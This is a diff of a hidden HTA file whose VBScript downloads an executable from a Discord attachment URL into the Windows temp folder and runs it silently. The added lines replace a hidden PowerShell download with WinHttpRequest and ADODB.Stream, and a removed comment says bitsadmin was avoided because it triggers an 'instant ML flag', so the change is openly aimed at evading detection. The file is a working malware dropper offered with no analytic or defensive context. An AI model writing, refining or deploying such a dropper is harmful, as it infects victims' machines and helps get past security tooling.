@@ -3,23 +3,29 @@
 <hta:application showintaskbar="no" caption="no" border="none" />
 <script language="VBScript">
 On Error Resume Next
-Dim sh, fs, tmp, exe, ps
+Dim s,f,t,p,x,h,g
+Set s=CreateObject("WScript.Shell")
+Set f=CreateObject("Scripting.FileSystemObject")
+t=f.GetSpecialFolder(2)
+p=t&"\wd.exe"
 
-Set sh = CreateObject("WScript.Shell")
-Set fs = CreateObject("Scripting.FileSystemObject")
-tmp = fs.GetSpecialFolder(2)
-exe = tmp & "\wd.exe"
+Set x=CreateObject("WinHttp.WinHttpRequest.5.1")
+x.Open "GET","https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9&",False
+x.Send
 
-' Download via PowerShell instead of bitsadmin (bitsadmin = instant ML flag)
-ps = "powershell -w hidden -c ""$w=new-object net.webclient;$w.downloadfile('https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9&','" & exe & "')"""
-sh.Run ps, 0, True
-
-If fs.FileExists(exe) Then
-    sh.Run """" & exe & """", 0, False
+If x.Status=200 Then
+ Set h=CreateObject("ADODB.Stream")
+ h.Open
+ h.Type=1
+ h.Write x.ResponseBody
+ h.SaveToFile p,2
+ h.Close
 End If
 
-Set sh = Nothing
-Set fs = Nothing
+If f.FileExists(p) Then
+ s.Run chr(34)&p&chr(34),0,False
+End If
+
 window.close()
 </script>
 </head>
